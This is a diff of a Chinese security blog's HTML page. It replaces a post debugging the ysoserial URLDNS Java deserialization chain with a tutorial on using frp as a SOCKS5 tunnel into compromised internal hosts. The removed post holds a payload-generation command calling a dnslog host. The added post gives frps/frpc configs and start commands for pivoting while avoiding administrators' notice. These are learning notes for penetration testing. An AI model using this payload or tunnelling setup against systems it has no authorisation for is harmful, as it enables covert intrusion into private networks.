@@ -8,7 +8,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    ysoserial-URLDNS利用链 调试分析 |  Wh1tecell&#39;blog
+    frp反代学习 |  Wh1tecell&#39;blog
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -43,7 +43,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-ysoserial-URLDNS利用链-调试分析"
+  id="post-frp反代学习"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -54,18 +54,18 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  ysoserial-URLDNS利用链 调试分析
+  frp反代学习
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2021/07/18/ysoserial-URLDNS%E5%88%A9%E7%94%A8%E9%93%BE-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" class="article-date">
-  <time datetime="2021-07-18T03:35:20.000Z" itemprop="datePublished">2021-07-18</time>
+      <a href="/2021/07/28/frp%E5%8F%8D%E4%BB%A3%E5%AD%A6%E4%B9%A0/" class="article-date">
+  <time datetime="2021-07-28T12:22:26.000Z" itemprop="datePublished">2021-07-28</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/web%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/">web技术学习</a> / <a class="article-category-link" href="/categories/web%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/javaweb/">javaweb</a>
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a> / <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/FRP/">FRP</a>
   </div>
   
 <div class="word_count">
@@ -73,7 +73,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">615</span>
+            <span class="post-count">1.3k</span>
         </span>
     </span>
 
@@ -82,7 +82,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">2 分钟</span>
+            <span class="post-count">4 分钟</span>
         </span>
     </span>
 </div>
@@ -97,48 +97,55 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p><img src="https://img-blog.csdnimg.cn/20210718103200852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>先下载工具<a target="_blank" rel="noopener" href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">ysoserial.jar</a>  当然你也可以去github下载 然后自己打包</p>
-<p>先用工具生成一个urldns链</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java  -jar ysoserial-master-d367e379d9-1.jar URLDNS http://89c7vr.dnslog.cn &gt; ou.bin</span><br><span class="line"># 这里的url 换成你自己生成的</span><br></pre></td></tr></table></figure>
+  <h2 id="FRP工具的介绍"><a href="#FRP工具的介绍" class="headerlink" title="FRP工具的介绍"></a>FRP工具的介绍</h2><h3 id="1-为什么需要内网穿透"><a href="#1-为什么需要内网穿透" class="headerlink" title="1.为什么需要内网穿透"></a><strong>1.为什么需要内网穿透</strong></h3><p>我们的物理机、服务器可能处于路由器后或者处于内网之中。如果我们想直接访问到这些设备（远程桌面、远程文件、SSH等等），一般来说要通过一些转发或者P2P(端到端)组网软件的帮助。</p>
+<p>其实，对于FRP穿透工具来说，它和端口转发有所不同，端口转发是只会进行单个端口的流量转发，但是这在渗透中往往是不行的，我们通过通过FRP进行内网的全流量的数据代理，像FRP可以代理全端口、全流量的数据，这样我们就可以使用SocksCap或者Proxifier等工具进行连接。</p>
+<h3 id="2-FRP介绍"><a href="#2-FRP介绍" class="headerlink" title="2.FRP介绍"></a><strong>2.FRP介绍</strong></h3><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持TCP、UDP协议，为HTTP和HTTPS应用协议提供了额外的能力，且尝试性支持了点对点穿透。frp 采用go语言开发。更多的人使用 frp 是为了进行反向代理，满足通过公网服务器访问处于内网的服务，如访问内网web服务，远程ssh内网服务器，远程控制内网NAS等，实现类似花生壳、ngrok等功能。而对于内网渗透来讲，这种功能恰好能够满足我们进行内网渗透的流量转发。FRP最大的一个特点是使用SOCKS代理，而SOCKS是加密通信的，类似于做了一个加密的隧道，可以把外网的流量，通过加密隧道穿透到内网。效果有些类似于VPN。</p>
+<h2 id="FRP工具原理"><a href="#FRP工具原理" class="headerlink" title="FRP工具原理"></a><strong>FRP工具原理</strong></h2><h3 id="1-FRP实现原理"><a href="#1-FRP实现原理" class="headerlink" title="1.FRP实现原理"></a><strong>1.FRP实现原理</strong></h3><p><strong>frp 主要由客户端(frpc)和服务端(frps)组成，服务端通常部署在具有公网 IP 的机器上，客户端通常部署在需要穿透的内网服务所在的机器上。</strong>内网服务由于没有公网 IP，不能被非局域网内的其他用户访问。隐藏用户通过访问服务端的 frps，由 frp 负责根据请求的端口或其他信息将请求路由到对应的内网机器，从而实现通信。</p>
+<p>首先，我们需要将FRP的服务端部署到公网VPS上，然后在我们拿下的那台内网主机上部署FRP的客户端，FRP在github上有多种版本，有些是有配置文件的，这样的话就需要在客户端和服务器端分别配置两个文件，客户端的文件分别是frpc文件和frpc.ini文件；服务器端的文件分别是frps文件和frps.ini文件。还有不需要配置文件的，这是作者经过二次开发的文件</p>
+<p>下载链接:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/uknowsec/frpModify%E3%80%82">https://github.com/uknowsec/frpModify。</a></p>
+<p>需要配置的下载链接:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
+<p>至于下载安装直接在项目的 releases 里下载自己对应的系统版本就行。</p>
+<h2 id="FRP使用场景"><a href="#FRP使用场景" class="headerlink" title="FRP使用场景"></a><strong>FRP使用场景</strong></h2><h3 id="1-windows主机"><a href="#1-windows主机" class="headerlink" title="1.windows主机"></a><strong>1.windows主机</strong></h3><ul>
+<li>第一种情况(3389出网)</li>
+</ul>
+<p>当我们拿下的这台windows主机开启3389端口时，那就比较好办了，我们可以直接拿到管理员hash解密或者新建用户等直接进行连接，这样我们可以在该主机上执行安装goby等常用的扫描工具，但是这样可能会被管理员发现；当然，我们也可以使用frp进行内网代理，在物理机上通过代理进行扫描。</p>
+<ul>
+<li>第二种情况(3389不出网)</li>
+</ul>
+<p>当我们拿下的这台内网主机是windows时，也就是内网WEB服务器是windows时，如果这台主机的3389端口没有映射到Nginx服务器上，那么，我们就不能使用远程桌面进行连接，如果需要扫描内网最好的办法就是使用frp等代理工具进行全流量代理，然后使用SocksCap或Proxifier等工具进行代理。</p>
+<h3 id="2-Linux主机"><a href="#2-Linux主机" class="headerlink" title="2.Linux主机"></a><strong>2.Linux主机</strong></h3><p>当我们拿下的主机是linux主机的时候，我们想要在该主机上安装一些扫描工具，可以使用命令行安装nmap、masscan等工具，但是相对来说容易被发现，因此也可以使用frp来进行代理，并且也不能进行远程桌面，因此，使用frp是相对来说比较好的方法。</p>
+<h2 id="socket代理建立"><a href="#socket代理建立" class="headerlink" title="socket代理建立"></a>socket代理建立</h2><p>我这里的配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali为服务端(Linux  x64)</span><br><span class="line"></span><br><span class="line">windows x64为客户端</span><br></pre></td></tr></table></figure>
 
-<p>测试代码</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//读取目标</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./ou.bin&quot;</span>));</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
-<p>再提一下 ，我们可以在idea导入这个jar包帮助我们分析</p>
-<p><img src="https://img-blog.csdnimg.cn/20210718105135771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h2><p>根据urldns链，我们先去 Hashmap.readObject()看看</p>
-<p>CTRL +shift+ f  搜索 hashmap  然后搜索 readObject 这个方法</p>
-<p>直接在putVal下断点  然后运行 test.java  开始debug</p>
-<p> 可以看到putVal一行有两个方法，我们根据链跟进hash方法(先F7跟进 再点击hash方法)</p>
-<p><img src="https://img-blog.csdnimg.cn/20210718103428344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>再继续F7 跟进hashCode方法</p>
-<p><img src="https://img-blog.csdnimg.cn/20210718103600285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210718103728820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>F8 后  ctrl+左键 发现这个handler是  URLStreamHandler的对象</p>
-<p><img src="https://img-blog.csdnimg.cn/20210718103828229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>那么再跟进这个 hashCode方法</p>
-<p><img src="https://img-blog.csdnimg.cn/2021071810411664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>发现了getHostAddress方法</p>
-<p>F7跟进getHostAddress 后 ，F8找到下图的getByName 函数 就会去进行一个 dns 查询，就可以发现dnslog 回显了</p>
-<p><img src="C:\Users\wh1tecell\AppData\Roaming\Typora\typora-user-images\image-20210718104228435.png" alt="image-20210718104228435"></p>
-<p>成功回显</p>
-<p><img src="https://img-blog.csdnimg.cn/20210718104321504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
-<li>总的来说，利用原理就是，当 hashmap 的key 在 put 以及 get 的时候，会计算key 的 hash ,而如果这个key 是 url 类型的时候，都会调用 java.net.URL#hashCode 方法来计算，在hashCode() 方法中，如果hashCode 不为-1 ，就会调用 java.net.URLStreamHandler#hashCode 方法，而这个方法里面就正好会进行 dns 查询。</li>
-<li>URLDNS 这个利用链主要用来检测是否存在反序列化漏洞，有如下两个优点：<pre><code>i. 使用java 内部的类进行构造，不依赖第三方库
-ii. 如果目标可以出网，在目标没有回显的时候，可以用来验证是否存在反序列化漏洞。
-</code></pre>
-</li>
-<li>另外，还有一些生成payload 的细节，可以看 ysoserial 生成URLDNS 的源码，比如：<br>i .在用 SilentURLStreamHandler 继承URLStreamHandler，重写了里面的getHostAddress() 方法来避免在生成payload 的时候进行 dns 查询。<br>ii. 将 url put 到hashmap 中之后，重新设置hashCode 为 -1 ，这样在反序列化的时候就会再重新计算hashCode </li>
-</ol>
-<p>参考:</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41891666/article/details/108018627?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~OPENSEARCH~default-1.pc_relevant_baidujshouduan&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~OPENSEARCH~default-1.pc_relevant_baidujshouduan">https://blog.csdn.net/qq_41891666/article/details/108018627?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EOPENSEARCH%7Edefault-1.pc_relevant_baidujshouduan&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EOPENSEARCH%7Edefault-1.pc_relevant_baidujshouduan</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43645782/article/details/118516559">https://blog.csdn.net/qq_43645782/article/details/118516559</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1SX4y1w7tv">https://www.bilibili.com/video/BV1SX4y1w7tv</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201762?from=timeline#h3-9">https://www.anquanke.com/post/id/201762?from=timeline#h3-9</a></p>
+
+<p>frps 拷贝到具有公网 IP 的机器上（也就是服务端）</p>
+<p>frpc 拷贝到内网服务所在的机器上（也就是客户端）</p>
+<h3 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h3><p> frps.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 4444</span><br><span class="line">token=@YWQJIJWD13</span><br></pre></td></tr></table></figure>
+
+<p>启动</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h3><p>frpc.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line"># 服务端 IP</span><br><span class="line">server_addr = kali_ip</span><br><span class="line"># 服务端端口</span><br><span class="line">server_port = 4444</span><br><span class="line">token = @YWQJIJWD13</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line"># 连接 vps 的端口</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+
+
+
+<p>启动</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure>
+
+<p>插件 设置代理</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/23967517a49fa0d2c56cd503fc45b4f2.png" alt="在这里插入图片描述"></p>
+<p>挂上这个代理就可以在kali上访问 windows机器的服务了</p>
+<p>参:<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&amp;mid=2247500724&amp;idx=3&amp;sn=b9993ac978f93396a9c4f30d36cb5a3f&amp;chksm=f9e3acefce9425f97a826cbafa37b576355f82c4dfa6914830c41be2694c14d1bacbecca7fba&amp;scene=27&amp;key=64b1564e87a40eec8cd3ef35d122136a5f38583b6b22f97f27abeb08b7d94649393f3eee044bd8a34ce3c2316350725bcc971e481d632280aaab75d7e235b85c29b55aa2ae57daef5739dd0f6cb11d5ec1dad3b1c1d511747d49d578a0c96ed5fbe0bc1af60e06aea8dfc8515230b740ed2edd4d39791733eba7aed60e7b6c63&amp;ascene=0&amp;uin=NTY2NTA4NjQ=&amp;devicetype=Windows+Server+2016+x64&amp;version=63010043&amp;lang=zh_CN&amp;expo">https://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&amp;mid=2247500724&amp;idx=3&amp;sn=b9993ac978f93396a9c4f30d36cb5a3f&amp;chksm=f9e3acefce9425f97a826cbafa37b576355f82c4dfa6914830c41be2694c14d1bacbecca7fba&amp;scene=27&amp;key=64b1564e87a40eec8cd3ef35d122136a5f38583b6b22f97f27abeb08b7d94649393f3eee044bd8a34ce3c2316350725bcc971e481d632280aaab75d7e235b85c29b55aa2ae57daef5739dd0f6cb11d5ec1dad3b1c1d511747d49d578a0c96ed5fbe0bc1af60e06aea8dfc8515230b740ed2edd4d39791733eba7aed60e7b6c63&amp;ascene=0&amp;uin=NTY2NTA4NjQ%3D&amp;devicetype=Windows+Server+2016+x64&amp;version=63010043&amp;lang=zh_CN&amp;expo</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzI5Mzk5NTIwMg==&amp;mid=2247485954&amp;idx=1&amp;sn=5e8d23a26b8986c6b9d9932ab8f6d77a">https://mp.weixin.qq.com/s?__biz=MzI5Mzk5NTIwMg==&amp;mid=2247485954&amp;idx=1&amp;sn=5e8d23a26b8986c6b9d9932ab8f6d77a</a></p>
  
       <!-- reward -->
       
@@ -203,7 +210,7 @@ ii. 如果目标可以出网，在目标没有回显的时候，可以用来验�
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2021/07/18/ysoserial-URLDNS%E5%88%A9%E7%94%A8%E9%93%BE-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2021/07/28/frp%E5%8F%8D%E4%BB%A3%E5%AD%A6%E4%B9%A0/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -214,19 +221,19 @@ ii. 如果目标可以出网，在目标没有回显的时候，可以用来验�
    
   <nav class="article-nav">
     
-      <a href="/2021/07/28/frp%E5%8F%8D%E4%BB%A3%E5%AD%A6%E4%B9%A0/" class="article-nav-link">
+      <a href="/2021/08/07/ctfshow-web%E4%B9%8Bssrf/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            frp反代学习
+            ctfshow web之ssrf
           
         </div>
       </a>
     
     
-      <a href="/2021/07/17/JAVA-web%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E4%B8%80/" class="article-nav-link">
+      <a href="/2021/07/18/ysoserial-URLDNS%E5%88%A9%E7%94%A8%E9%93%BE-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">JAVA web暑期学习一</div>
+        <div class="article-nav-title">ysoserial-URLDNS利用链 调试分析</div>
       </a>
     
   </nav>
